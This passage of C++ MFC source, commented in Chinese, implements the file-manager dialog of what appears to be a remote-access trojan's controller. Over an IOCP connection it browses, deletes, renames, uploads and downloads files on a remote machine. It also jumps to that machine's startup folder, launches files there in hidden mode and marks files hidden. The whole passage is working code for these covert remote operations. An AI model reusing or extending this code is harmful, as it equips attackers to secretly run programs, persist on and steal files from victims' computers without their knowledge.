					CTime	time(ftm_strReceiveLocalFileTime);
					m_listfile.SetItemText(nItem, 3, time.Format(_T("%Y-%m-%d %H:%M")));
				}
				pList += 16;
			}
		}
	}

	m_listfile.SetRedraw(TRUE);
	// 恢复窗口
	m_listfile.EnableWindow(TRUE);

	ShowMessage(_T("远程: 装载目录 %s 完成"), m_Remote_Path);
	
	
}

/// <summary>
/// 点击桌面
/// </summary>
void CFileDlg::OnBnClickedButton1()
{
	// TODO: 在此添加控件通知处理程序代码
	m_path.SetWindowTextA(m_strDesktopPath)  ;
	m_listfile.SetSelectionMark(-1);
	GetRemoteFileList();
}

void CFileDlg::EnableControl(BOOL bEnable)
{
	
	m_listfile.EnableWindow(bEnable);

}

void CFileDlg::OnNMDblclkList1(NMHDR* pNMHDR, LRESULT* pResult)
{
	if (m_listfile.GetSelectedCount() == 0 || m_listfile.GetItemData(m_listfile.GetSelectionMark()) != 1)
		return;
	// TODO: Add your control notification handler code here
	GetRemoteFileList();
	*pResult = 0;
}

/// <summary>
/// 点击启动项
/// </summary>
void CFileDlg::OnBnClickedButton3()
{
	// TODO: 在此添加控件通知处理程序代码
	m_path.SetWindowTextA(m_strStartupPath);
	m_listfile.SetSelectionMark(-1);
	GetRemoteFileList();
}

/// <summary>
/// 鼠标右键单机
/// </summary>
/// <param name="pNMHDR"></param>
/// <param name="pResult"></param>
void CFileDlg::OnNMRClickList1(NMHDR* pNMHDR, LRESULT* pResult)
{
	// TODO: Add your control notification handler code here
	int	nRemoteOpenMenuIndex = 2;
	CListCtrl* pListCtrl = &m_listfile;
	CMenu	popup;
	popup.LoadMenu(IDR_FILE);
	CMenu* pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);


	if (pListCtrl->GetSelectedCount() == 0)
	{
		int	count = pM->GetMenuItemCount();
		for (int i = 0; i < count; i++)
		{
			pM->EnableMenuItem(i, MF_BYPOSITION | MF_GRAYED);
		}
	}

	if (pListCtrl->GetSelectedCount() <= 1)
	{
		pM->EnableMenuItem(IDM_NEWFOLDER, MF_BYCOMMAND | MF_ENABLED);
	}


	if (pListCtrl->GetSelectedCount() == 1)
	{
		// 是文件夹
		if (pListCtrl->GetItemData(pListCtrl->GetSelectionMark()) == 1)
		{
			pM->EnableMenuItem(nRemoteOpenMenuIndex, MF_BYPOSITION | MF_GRAYED);
			
		}

		else
		{
			pM->EnableMenuItem(nRemoteOpenMenuIndex, MF_BYPOSITION | MF_ENABLED);
			
		}

	}
	else
		pM->EnableMenuItem(nRemoteOpenMenuIndex, MF_BYPOSITION | MF_GRAYED);


	pM->EnableMenuItem(IDM_REFRESH, MF_BYCOMMAND | MF_ENABLED);
	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);

	*pResult = 0;
}


/// <summary>
/// 工具栏图标处理
/// </summary>
/// <param name="pCmdUI"></param>
void CFileDlg::OnUpdateIdtRemoteDelete(CCmdUI* pCmdUI)
{
	pCmdUI->Enable(m_Remote_Path.GetLength() && m_listfile.GetSelectedCount() && m_listfile.IsWindowEnabled());
}

/// <summary>
/// 工具栏图标处理
/// </summary>
/// <param name="pCmdUI"></param>
void CFileDlg::OnUpdateIdtRemoteCopy(CCmdUI* pCmdUI)
{
	pCmdUI->Enable(0);
}

/// <summary>
/// 工具栏图标处理
/// </summary>
/// <param name="pCmdUI"></param>
void CFileDlg::OnUpdateIdtRemotePrev(CCmdUI* pCmdUI)
{
	pCmdUI->Enable(m_Remote_Path.GetLength() && m_listfile.IsWindowEnabled());
}

/// <summary>
/// 工具栏图标处理
/// </summary>
/// <param name="pCmdUI"></param>
void CFileDlg::OnUpdateIdtRemoteNewfolder(CCmdUI* pCmdUI)
{
	pCmdUI->Enable(m_Remote_Path.GetLength() && m_listfile.IsWindowEnabled());
}

/// <summary>
/// 工具栏图标处理
/// </summary>
/// <param name="pCmdUI"></param>
void CFileDlg::OnUpdateIdtRemoteStop(CCmdUI* pCmdUI)
{
	pCmdUI->Enable(!m_listfile.IsWindowEnabled() && !m_bIsUpload);
}

/// <summary>
/// 工具栏图标处理
/// </summary>
/// <param name="pCmdUI"></param>
void CFileDlg::OnIdtRemoteView()
{
	m_listfile.ModifyStyle(LVS_TYPEMASK, LVS_ICON);
}

/// <summary>
/// 大图标显示
/// </summary>
void CFileDlg::OnRviewDa()
{
	m_listfile.ModifyStyle(LVS_TYPEMASK, LVS_ICON);
}

/// <summary>
/// 小图标显示
/// </summary>
void CFileDlg::OnRviewXiao()
{
	m_listfile.ModifyStyle(LVS_TYPEMASK, LVS_SMALLICON);
}

/// <summary>
/// 列表显示
/// </summary>
void CFileDlg::OnRviewList()
{
	m_listfile.ModifyStyle(LVS_TYPEMASK, LVS_LIST);
}

/// <summary>
/// 详细信息
/// </summary>
void CFileDlg::OnRviewXiang()
{
	m_listfile.ModifyStyle(LVS_TYPEMASK, LVS_REPORT);
}

/// <summary>
/// 工具条下载
/// </summary>
void CFileDlg::OnIdtRemoteDown()
{
	
}

/// <summary>
/// 删除
/// </summary>
void CFileDlg::OnIdtRemoteDelete()
{
	m_bIsUpload = false;
	// TODO: Add your command handler code here
	CString str;
	if (m_listfile.GetSelectedCount() > 1)
		str.Format(_T("确定要将这 %d 项删除吗?"), m_listfile.GetSelectedCount());
	else
	{
		CString file = m_listfile.GetItemText(m_listfile.GetSelectionMark(), 0);
		if (m_listfile.GetItemData(m_listfile.GetSelectionMark()) == 1)
			str.Format(_T("确实要删除文件夹“%s”并将所有内容删除吗?"), file);
		else
			str.Format(_T("确实要把“%s”删除吗?"), file);
	}
	if (::MessageBox(m_hWnd, str, "确认删除", MB_YESNO | MB_ICONQUESTION) == IDNO)
		return;
	m_Remote_Delete_Job.RemoveAll();
	POSITION pos = m_listfile.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	while (pos) //so long as we have a valid POSITION, we keep iterating
	{
		int nItem = m_listfile.GetNextSelectedItem(pos);
		CString	file = m_Remote_Path + m_listfile.GetItemText(nItem, 0);
		// 如果是目录
		if (m_listfile.GetItemData(nItem))
			file += '\\';

		m_Remote_Delete_Job.AddTail(file);
	} //EO while(pos) -- at this point we have deleted the moving items and stored them in memory

	EnableControl(FALSE);
	// 发送第一个删除任务
	SendDeleteJob();
}

/// <summary>
/// 新建文件夹
/// </summary>
void CFileDlg::OnIdtRemoteNewfolder()
{
	if (m_Remote_Path == "")
		return;
	// TODO: Add your command handler code here
	// TODO: Add your command handler code here
	CInputDialog	dlg;
	dlg.Init(_T("新建目录"), _T("请输入目录名称:"), this);

	if (dlg.DoModal() == IDOK && dlg.m_str.GetLength())
	{
		CString file = m_Remote_Path + dlg.m_str + "\\";
		UINT	nPacketSize = file.GetLength() + 2;
		// 创建多层目录
		LPBYTE	lpBuffer = (LPBYTE)LocalAlloc(LPTR, file.GetLength() + 2);
		lpBuffer[0] = COMMAND_CREATE_FOLDER;
		memcpy(lpBuffer + 1, file.GetBuffer(0), nPacketSize - 1);
		m_iocpServer->Send(m_pContext, lpBuffer, nPacketSize);
		LocalFree(lpBuffer);
	}
}

/// <summary>
/// 向上返回
/// </summary>
void CFileDlg::OnIdtRemotePrev()
{
	GetRemoteFileList("..");
}

/// <summary>
/// 停止
/// </summary>
void CFileDlg::OnIdtRemoteStop()
{
	m_bIsStop = true;
}

// 发出一个删除任务
BOOL CFileDlg::SendDeleteJob()
{
	if (m_Remote_Delete_Job.IsEmpty())
		return FALSE;
	// 发出第一个删除任务命令
	CString file = m_Remote_Delete_Job.GetHead();
	int		nPacketSize = file.GetLength() + 2;
	BYTE* bPacket = (BYTE*)LocalAlloc(LPTR, nPacketSize);

	if (file.GetAt(file.GetLength() - 1) == '\\')
	{
		ShowMessage(_T("远程：删除目录 %s\\*.* 完成"), file);
		bPacket[0] = COMMAND_DELETE_DIRECTORY;
	}
	else
	{
		ShowMessage(_T("远程：删除文件 %s 完成"), file);;
		bPacket[0] = COMMAND_DELETE_FILE;
	}
	// 文件偏移，续传时用
	memcpy(bPacket + 1, file.GetBuffer(0), nPacketSize - 1);
	m_iocpServer->Send(m_pContext, bPacket, nPacketSize);

	LocalFree(bPacket);
	// 从下载任务列表中删除自己
	m_Remote_Delete_Job.RemoveHead();
	return TRUE;
}

void CFileDlg::EndRemoteDeleteFile()
{
	if (m_Remote_Delete_Job.IsEmpty() || m_bIsStop)
	{
		m_bIsStop = false;
		EnableControl(TRUE);
		GetRemoteFileList(".");
		ShowMessage(_T("远程：装载目录 %s\\*.* 完成"), m_Remote_Path);
	}
	else
	{
		// 我靠，不sleep下会出错，服了可能以前的数据还没send出去
		Sleep(5);
		SendDeleteJob();
	}
	return;
}

void CFileDlg::EndRemoteHideFile()
{
	if (m_Remote_Delete_Job.IsEmpty() || m_bIsStop)
	{
		m_bIsStop = false;
		EnableControl(TRUE);
		GetRemoteFileList(".");
	}
	else
	{
		// 我靠，不sleep下会出错，服了可能以前的数据还没send出去
		Sleep(5);
		SendHideJob();
	}
	return;
}


/// <summary>
/// 重命名
/// </summary>
void CFileDlg::OnRename()
{
	// TODO: Add your command handler code here
	POINT pt;
	GetCursorPos(&pt);
	m_listfile.EditLabel(m_listfile.GetSelectionMark());

}

/// <summary>
/// 重命名完毕
/// </summary>
/// <param name="pNMHDR"></param>
/// <param name="pResult"></param>
void CFileDlg::OnLvnEndlabeleditList1(NMHDR* pNMHDR, LRESULT* pResult)
{
	LV_DISPINFO* pDispInfo = (LV_DISPINFO*)pNMHDR;
	// TODO: Add your control notification handler code here
	CString str, strExistingFileName, strNewFileName;
	m_listfile.GetEditControl()->GetWindowText(str);

	strExistingFileName = m_Remote_Path + m_listfile.GetItemText(pDispInfo->item.iItem, 0);
	strNewFileName = m_Remote_Path + str;

	if (strExistingFileName != strNewFileName)
	{
		UINT nPacketSize = strExistingFileName.GetLength() + strNewFileName.GetLength() + 3;
		LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketSize);
		lpBuffer[0] = COMMAND_RENAME_FILE;
		memcpy(lpBuffer + 1, strExistingFileName.GetBuffer(0), strExistingFileName.GetLength() + 1);
		memcpy(lpBuffer + 2 + strExistingFileName.GetLength(),
			strNewFileName.GetBuffer(0), strNewFileName.GetLength() + 1);
		m_iocpServer->Send(m_pContext, lpBuffer, nPacketSize);
		LocalFree(lpBuffer);
	}
	*pResult = 1;
}

/// <summary>
/// 刷新
/// </summary>
void CFileDlg::OnRefresh()
{
	GetRemoteFileList(".");
}

/// <summary>
/// 显示运行
/// </summary>
void CFileDlg::OnShowRun()
{
	// TODO: Add your command handler code here
	CString	str;
	str = m_Remote_Path + m_listfile.GetItemText(m_listfile.GetSelectionMark(), 0);
	int		nPacketLength = str.GetLength() + 2;
	LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
	lpPacket[0] = COMMAND_OPEN_FILE_SHOW;
	memcpy(lpPacket + 1, str.GetBuffer(0), nPacketLength - 1);
	m_iocpServer->Send(m_pContext, lpPacket, nPacketLength);
	LocalFree(lpPacket);
}

/// <summary>
/// 隐藏运行
/// </summary>
void CFileDlg::OnHideRun()
{
	CString	str;
	str = m_Remote_Path + m_listfile.GetItemText(m_listfile.GetSelectionMark(), 0);
	int		nPacketLength = str.GetLength() + 2;
	LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
	lpPacket[0] = COMMAND_OPEN_FILE_HIDE;
	memcpy(lpPacket + 1, str.GetBuffer(0), nPacketLength - 1);
	m_iocpServer->Send(m_pContext, lpPacket, nPacketLength);
	//delete [] lpPacket;
	LocalFree(lpPacket);
}


// 发出一个下载任务
BOOL CFileDlg::SendDownloadJob()
{

	if (m_Remote_Download_Job.IsEmpty())
		return FALSE;

	// 发出第一个下载任务命令
	CString file = m_Remote_Download_Job.GetHead();
	int		nPacketSize = file.GetLength() + 2;
	BYTE* bPacket = (BYTE*)LocalAlloc(LPTR, nPacketSize);
	bPacket[0] = COMMAND_DOWN_FILES;
	// 文件偏移，续传时用
	memcpy(bPacket + 1, file.GetBuffer(0), file.GetLength() + 1);
	m_iocpServer->Send(m_pContext, bPacket, nPacketSize);

	LocalFree(bPacket);
	// 从下载任务列表中删除自己

	m_Remote_Download_Job.RemoveHead();

	return TRUE;
}

/// <summary>
/// 下载文件
/// </summary>
void CFileDlg::OnFileDown()
{
	m_bIsUpload = false;
	// 禁用文件管理窗口
	EnableControl(FALSE);

	// 重置下载任务列表
	m_Remote_Download_Job.RemoveAll();
	POSITION pos = m_listfile.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	while (pos) //so long as we have a valid POSITION, we keep iterating
	{
		int nItem = m_listfile.GetNextSelectedItem(pos);
		CString	file = m_Remote_Path + m_listfile.GetItemText(nItem, 0);
		// 如果是目录
		if (m_listfile.GetItemData(nItem))
			file += '\\';
		// 添加到下载任务列表中去
		m_Remote_Download_Job.AddTail(file);
	} //EO while(pos) -- at this point we have deleted the moving items and stored them in memory

	// 发送第一个下载任务
	SendDownloadJob();
}


// 发出一个上传任务
BOOL CFileDlg::SendUploadJob()
{
	CString strDestDirectory = m_Remote_Path;

	if (strDestDirectory.IsEmpty())
	{
		EnableControl(1);
		m_bIsUpload = true;
		return 0;
	}
	// 如果远程也有选择，当做目标文件夹
	int nItem = m_listfile.GetSelectionMark();

	if (nItem != -1 && m_listfile.GetItemData(nItem) == 1) // 是文件夹
	{
		strDestDirectory += m_listfile.GetItemText(nItem, 0) + "\\";
	}//新修改


	// 发出第一个下载任务命令
	m_strOperatingFile = m_Remote_Upload_Job.GetHead();

	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
	// 1 字节token, 8字节大小, 文件名称, '\0'
	HANDLE	hFile;
	CString	fileRemote = m_strOperatingFile; // 远程文件
	// 得到要保存到的远程的文件路径
	fileRemote.Replace(m_Local_Path, strDestDirectory);

	m_strUploadRemoteFile = fileRemote;
	hFile = CreateFile(m_strOperatingFile.GetBuffer(0), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
		return FALSE;
	dwSizeLow = GetFileSize(hFile, &dwSizeHigh);
	m_nOperatingFileLength = (dwSizeHigh * (MAXDWORD)) + dwSizeLow;

	CloseHandle(hFile);
	// 构造数据包，发送文件长度
	int		nPacketSize = fileRemote.GetLength() + 10;
	BYTE* bPacket = (BYTE*)LocalAlloc(LPTR, nPacketSize);
	memset(bPacket, 0, nPacketSize);

	bPacket[0] = COMMAND_FILE_SIZE;
	memcpy(bPacket + 1, &dwSizeHigh, sizeof(DWORD));
	memcpy(bPacket + 5, &dwSizeLow, sizeof(DWORD));
	memcpy(bPacket + 9, fileRemote.GetBuffer(0), fileRemote.GetLength() + 1);

	m_iocpServer->Send(m_pContext, bPacket, nPacketSize);

	LocalFree(bPacket);

	// 从下载任务列表中删除自己
	m_Remote_Upload_Job.RemoveHead();
	

	return TRUE;
}


bool CFileDlg::FixedUploadDirectory(LPCTSTR lpPathName)
{
	char	lpszFilter[MAX_PATH];
	char* lpszSlash = NULL;
	memset(lpszFilter, 0, sizeof(lpszFilter));

	if (lpPathName[lstrlen(lpPathName) - 1] != '\\')
		lpszSlash = "\\";
	else
		lpszSlash = "";

	wsprintf(lpszFilter, "%s%s*.*", lpPathName, lpszSlash);


	WIN32_FIND_DATA	wfd;
	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
	if (hFind == INVALID_HANDLE_VALUE) // 如果没有找到或查找失败
		return FALSE;

	do
	{
		if (wfd.cFileName[0] == '.')
			continue; // 过滤这两个目录 
		if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			char strDirectory[MAX_PATH];
			wsprintf(strDirectory, "%s%s%s", lpPathName, lpszSlash, wfd.cFileName);
			FixedUploadDirectory(strDirectory); // 如果找到的是目录，则进入此目录进行递归 
		}
		else
		{
			CString file;
			file.Format(_T("%s%s%s"), lpPathName, lpszSlash, wfd.cFileName);
			//printf("send file %s\n",strFile);
			m_Remote_Upload_Job.AddTail(file);
			// 对文件进行操作 
		}
	} while (FindNextFile(hFind, &wfd));
	FindClose(hFind); // 关闭查找句柄
	return true;
}


void CFileDlg::OnDropFiles(HDROP hDropInfo)
{
	char szFilePathName[_MAX_PATH] = { 0 };
	
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	
	//得到文件个数      
	//UINT nNumOfFiles = DragQueryFile(hDropInfo, 0xFFFFFFFF, NULL, 0);

	DragQueryFile(hDropInfo, 0, (LPTSTR)szFilePathName, _MAX_PATH);

	m_Local_Path = szFilePathName;
	this->PostMessage(WM_ADDTOLIST, 0, NULL);
	CDialog::OnDropFiles(hDropInfo);

	
}

//下载
afx_msg LRESULT CFileDlg::OnUpload(WPARAM wParam, LPARAM lParam)
{
	m_bIsUpload = true;

	// 重置上传任务列表
	m_Remote_Upload_Job.RemoveAll();
	WIN32_FIND_DATAA filedata;

	HANDLE pHandle = FindFirstFileA(m_Local_Path.GetBuffer(),&filedata);

	if (pHandle != INVALID_HANDLE_VALUE)
	{
		if (filedata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			m_Local_Path += '\\';
			CString Tmp = GetParentDirectory(m_Local_Path);
			FixedUploadDirectory(m_Local_Path.GetBuffer());
			m_Local_Path = Tmp;	
		}
		else
		{
			
			// 添加到上传任务列表中去
			m_Remote_Upload_Job.AddTail(m_Local_Path);
			m_Local_Path = m_Local_Path.Left(m_Local_Path.ReverseFind('\\')) + '\\';
		}

		FindClose(pHandle);
	}
	else
	{
		MessageBoxA("文件读取错误");
		return 0;
	}


	if (m_Remote_Upload_Job.IsEmpty())
	{
		::MessageBox(m_hWnd, "文件夹为空", "警告", MB_OK | MB_ICONWARNING);
		return 0;
	}

	EnableControl(FALSE);
	SendUploadJob();
	return 0;
}

//隐藏文件
void CFileDlg::OnFileHide()
{
	m_bIsUpload = false;

	m_Remote_Delete_Job.RemoveAll();

	POSITION pos = m_listfile.GetFirstSelectedItemPosition(); //iterator for the CListCtrl

	while (pos) //so long as we have a valid POSITION, we keep iterating
	{
		int nItem = m_listfile.GetNextSelectedItem(pos);
		CString	file = m_Remote_Path + m_listfile.GetItemText(nItem, 0);
		m_Remote_Delete_Job.AddTail(file);
	} //EO while(pos) -- at this point we have deleted the moving items and stored them in memory

	EnableControl(FALSE);
	// 发送第一个删除任务
	SendHideJob();
}

// 发出一个删除任务
BOOL CFileDlg::SendHideJob()
{
	if (m_Remote_Delete_Job.IsEmpty())
		return FALSE;
	// 发出第一个删除任务命令
	CString file = m_Remote_Delete_Job.GetHead();
	int		nPacketSize = file.GetLength() + 2;
	BYTE* bPacket = (BYTE*)LocalAlloc(LPTR, nPacketSize);

	ShowMessage(_T("远程：隐藏文件 %s 完成"), file);
	bPacket[0] = COMMAND_HIDE_FILE;
	// 文件偏移，续传时用
	memcpy(bPacket + 1, file.GetBuffer(0), nPacketSize - 1);
	m_iocpServer->Send(m_pContext, bPacket, nPacketSize);
	LocalFree(bPacket);
	// 从下载任务列表中删除自己
	m_Remote_Delete_Job.RemoveHead();
	return TRUE;
}

extern int strsort_column;	// 记录点击的列
//排序
void CFileDlg::OnLvnColumnclickList1(NMHDR* pNMHDR, LRESULT* pResult)
{
	LPNMLISTVIEW pNMLV = reinterpret_cast<LPNMLISTVIEW>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	strsort_column = pNMLV->iSubItem;//点击的列
	int count = m_listfile.GetItemCount();
	for (int i = 0; i < count; i++)
		m_listfile.SetItemData(i, i); // 每行的比较关键字，此处为列序号（点击的列号），可以设置为其他 比较函数的第一二个参数
	m_listfile.SortItems(CompareListStrProc, (DWORD_PTR)&m_listfile);//排序 第二个参数是比较函数的第三个参数
	*pResult = 0;
}
